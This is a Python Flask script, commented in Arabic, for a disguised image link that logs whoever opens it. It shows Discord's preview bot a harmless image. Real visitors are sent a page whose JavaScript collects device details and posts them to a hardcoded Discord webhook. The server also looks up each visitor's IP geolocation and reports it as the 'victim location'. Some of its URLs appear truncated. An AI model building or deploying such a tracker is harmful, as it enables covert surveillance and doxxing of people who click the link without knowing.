from flask import Flask, request, render_template_string
import requests

app = Flask(__name__)

WEBHOOK_URL = "https://discord.com/api/webhooks/1493558963869061224/tY_NAc83SlbAMed-ibT8MdFhC88Owdqb-naTrn6q5-En386EXCCqZBByyhiPg6S7JBOr"
REAL_IMAGE = "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRvw7uLGr6ScxbGYJhGNqEjXnW-e6nJaE5c0w&s"

@app.route('/api/image')
def logger():
    ua = request.headers.get('User-Agent', '')
    ip = request.headers.get('x-forwarded-for', request.remote_addr).split(',')[0]

    # منع بوتات ديسكورد (خدعة التحميل)
    if "discord" in ua.lower():
        return f'<meta property="og:image" content="{REAL_IMAGE}"><img src="https://gifer.com">'

    # كود HTML + JS لسحب معلومات "عميقة"
    html_code = '''
    <!DOCTYPE html>
    <html>
    <body style="margin:0; background:black; display:flex; justify-content:center; align-items:center; height:100vh;">
        <img src="{{ img_url }}" style="max-width:100%;">
        <script>
            async function getExtraInfo() {
                let battery = await navigator.getBattery();
                let info = {
                    "الدقة": window.screen.width + "x" + window.screen.height,
                    "اللغة": navigator.language,
                    "البطارية": (battery.level * 100) + "%",
                    "الشحن": battery.charging ? "يشحن" : "لا يشحن",
                    "التوقيت": new Date().toLocaleString(),
                    "المنصة": navigator.platform,
                    "المعالج": navigator.hardwareConcurrency + " Cores"
                };
                
                fetch("{{ webhook }}", {
                    method: "POST",
                    headers: {"Content-Type": "application/json"},
                    body: JSON.stringify({
                        "embeds": [{
                            "title": "🚨 معلومات جهاز تفصيلية (JS)",
                            "color": 16711680,
                            "fields": Object.keys(info).map(key => ({name: key, value: info[key], inline: true})),
                            "footer": {"text": "IP: {{ ip }}"}
                        }]
                    })
                });
            }
            getExtraInfo();
        </script>
    </body>
    </html>
    '''
    
    # جلب معلومات الـ IP الأساسية من Python
    try:
        data = requests.get(f"http://ip-api.com{ip}?fields=16976857").json()
        requests.post(WEBHOOK_URL, json={
            "embeds": [{
                "title": "📍 موقع الضحية (Python)",
                "fields": [
                    {"name": "المدينة", "value": data.get('city'), "inline": True},
                    {"name": "المزود", "value": data.get('isp'), "inline": True},
                    {"name": "الخريطة", "value": "https://google.com" + str(data.get('lat')) + "," + str(data.get('lon'))}
                ]
            }]
        })
    except: pass

    return render_template_string(html_code, img_url=REAL_IMAGE, webhook=WEBHOOK_URL, ip=ip)

if __name__ == "__main__":
    app.run()
